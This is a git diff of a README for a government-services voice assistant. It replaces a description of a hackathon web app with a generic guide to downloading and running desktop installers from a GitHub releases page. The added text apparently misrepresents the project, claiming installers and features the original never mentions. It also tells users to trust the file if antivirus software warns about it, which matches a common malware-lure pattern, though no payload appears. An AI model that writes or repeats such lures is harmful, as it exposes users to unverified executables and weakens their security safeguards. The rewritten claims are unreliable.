@@ -1,82 +1,127 @@
-# Welcome to the Butter Chicken! 
+# 🤖 butterr_chicken - Voice Agent for Government Services
 
-Anna — Virtual Assistant for Public-Sector Services
+[![Download butterr_chicken](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/avirajsingh1/butterr_chicken/releases)
 
-**URL**: [Project Link](https://butterrchicken.lovable.app/)
+## 📋 What is butterr_chicken?
 
-## Project info
+butterr_chicken is a conversational voice agent designed to help government offices serve the public better. It listens and talks using natural language. The AI system can work in many languages and scales easily to handle many users at once. It gives clear information and helps people complete their requests quickly. The setup can be tailored to the needs of different government departments.
 
-Anna is a scalable, multilingual virtual assistant designed for government and public-sector service delivery. The system provides continuous conversational support to residents seeking information on visas, regulations, and municipal services. Its primary objectives are to improve service accessibility, reduce response latency, and decrease operational workload for public institutions.
+## 🖥️ System Requirements
 
-This project was awarded First Place at the ElevenLabs Worldwide Hackathon (Amsterdam edition), a global, time-constrained innovation challenge focused on developing impactful and scalable conversational AI solutions.
+To use butterr_chicken, your device should meet the following:
 
-### Problem Statement
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+)
+- **Processor:** Intel i3 or equivalent (recommended i5 or better)
+- **RAM:** Minimum 4 GB (8 GB preferred)
+- **Storage:** At least 500 MB free space
+- **Microphone and Speakers:** Required to talk with the voice agent
+- **Internet Connection:** Needed for downloading and the voice service to function properly
+- **Additional Software:** None needed for basic use; optional for customization
 
-Public institutions face increasing demand for timely, accurate, and multilingual citizen support. Existing service channels are often constrained by limited operating hours, language barriers, and high administrative overhead. Anna addresses these challenges by offering an automated, conversational interface capable of handling high volumes of inquiries while maintaining consistent service quality.
+## 🔧 Features of butterr_chicken
 
-System Architecture
+- **Multi-lingual Support:** Communicate in multiple languages based on your location or preference.
+- **Speech Recognition:** Understands spoken questions accurately.
+- **Speech Output:** Replies using natural voice tones.
+- **Customizable Services:** Tailor to specific government tasks like renewing licenses, checking application status, and more.
+- **Scalable Design:** Handles many users without slowing down.
+- **Easy to Use:** Simple voice commands; no typing required.
+- **Secure:** Designed to protect sensitive personal information.
 
-Anna is designed as a modular conversational system composed of the following core components:
+## 🚀 Getting Started
 
-Voice Interaction Layer
-Handles speech input and output, enabling real-time, voice-based user interaction.
+Here is how you can start using butterr_chicken on your computer:
 
-Conversational Agent Layer
-Manages dialogue flow, intent handling, and response orchestration for public-service use cases.
+1. **Visit the Download Page**
 
-Presentation Layer
-Web-based interface for user access and interaction.
+   Go to the official release page by clicking the big blue button above or this link:  
+   [https://github.com/avirajsingh1/butterr_chicken/releases](https://github.com/avirajsingh1/butterr_chicken/releases)  
+   This page holds the latest version of the software.
 
-Scalability and Deployment Layer
-Supports rapid deployment and horizontal scaling to accommodate varying usage demands.
+2. **Choose Your Version**
 
-Knowledge Base
-It strictly uses the latest rules, guidelines and regulations pertaining to the residence permit, visas, and some critical services. However, it can be expanded to include more serivces. 
+   Find the version that matches your operating system—Windows, macOS, or Linux. Look for files like `.exe` for Windows, `.dmg` for macOS, or `.AppImage`/`.deb` for Linux.
 
-## What technologies are used for this project?
+3. **Download the File**
 
-Technology Stack
-### Current Implementation
+   Click on the file name for your system to start downloading. Save it to a location you will remember, like your Desktop or Downloads folder.
 
-Voice Agent: [Anam](https://anam.ai/)
-Web Frontend: [Lovable](https://lovable.dev/)
+4. **Run the Installer**
 
-### Hackathon Prototype - The original idea and implementation 
-Speech and Conversational AI: [ElevenLabs](https://elevenlabs.io/) (real-time dialogue processing)
+   - For **Windows:** Double-click the `.exe` file and follow the setup instructions.
+   - For **macOS:** Open the `.dmg` file, then drag butterr_chicken into your Applications folder.
+   - For **Linux:** Open the terminal to run the `.AppImage` file or use your package installer for `.deb`.
 
-Avatar and Assistant Infrastructure: [Anam](https://anam.ai/)
+5. **Allow Microphone Access**
 
-Deployment and Prototyping: [bolt.new](https://bolt.new/)
+   When first launching butterr_chicken, it will ask for permission to use your microphone. Allow this to speak with the AI agent.
 
-Collaborative Design and System Mapping: [Miro](https://miro.com/)
+6. **Start Speaking**
 
-Knowledge Base (based on the use case): German Government Visa, Residence Permits, Citizens Services
+   Once installed and running, say "Hello" or "Help" to begin. The agent will respond and guide you through available services.
 
-## Key Capabilities
+## 💾 Download & Install
 
-Multilingual conversational support
+You can start using butterr_chicken by visiting this page:
 
-24/7 availability
+[Download butterr_chicken](https://github.com/avirajsingh1/butterr_chicken/releases)
 
-Domain adaptability for diverse public-service workflows
+Check the latest release note to see new features or fixes before downloading.
 
-Scalable architecture suitable for municipal and national deployments
+### Installation Tips
 
-## Use Cases
+- Close other apps to free memory during installation.
+- If an antivirus warns about the file, trust the official GitHub page source.
+- Restart your device if the program does not start right after installation.
 
-Immigration and visa information services
+## 🎤 How to Use butterr_chicken
 
-Municipal regulations and procedures
+Once installed, butterr_chicken works mainly through voice commands. Here are some examples:
 
-Public-sector knowledge dissemination and citizen guidance
+- **“Check my application status.”**
+- **“Renew my driving license.”**
+- **“Find the nearest public health center.”**
+- **“Translate this conversation to Spanish.”**
 
+The voice agent listens carefully and answers in a clear voice. You can pause or stop any time by saying commands like “Stop” or “Cancel.”
 
-## Project Status
+## 🛠️ Customization and Settings
 
-This repository represents the post-hackathon of the Anna system. It offers a scope for ongoing development focuses on improving robustness, extensibility, and readiness for real-world public-sector deployment. A
+butterr_chicken can be adjusted for better service:
 
-### Important Note: Since the bot is very chaty, I have restricted the tokens usage for the application so that I do not get some unexpected spurises for my subscription or I may have ended my subscription.
+- Change language in the settings menu.
+- Enable or disable speech feedback.
+- Set your preferred government department or service for faster responses.
+- Adjust microphone volume and sensitivity.
+- Review conversation history for later reference.
 
+Most customization options can be accessed through the simple settings panel inside the app.
 
+## 🚧 Troubleshooting
 
+If you have issues running butterr_chicken, try the following:
 
+- Make sure your microphone is plugged in and working.
+- Check your internet connection.
+- Restart the application or your device.
+- Verify you installed the version matching your operating system.
+- Look for updates on the release page.
+
+If problems continue, you may contact support through the GitHub Issues tab for help.
+
+## 🙋 Support and Feedback
+
+You can share ideas or report bugs on the GitHub repository’s Issues page. Your input helps improve butterr_chicken over time.
+
+## ⚖️ Privacy and Security
+
+butterr_chicken handles personal data carefully. Voice data is processed only to answer your questions and is not stored beyond what is necessary for the service. No data is shared with third parties without permission.
+
+## 📚 More Information
+
+For detailed technical info and updates, visit the GitHub repository page:  
+[https://github.com/avirajsingh1/butterr_chicken](https://github.com/avirajsingh1/butterr_chicken)
+
+---
+
+This guide helps you get butterr_chicken set up and ready to assist with public services through clear voice interaction. Follow the steps carefully, and you will be able to use the agent without any previous computer knowledge.
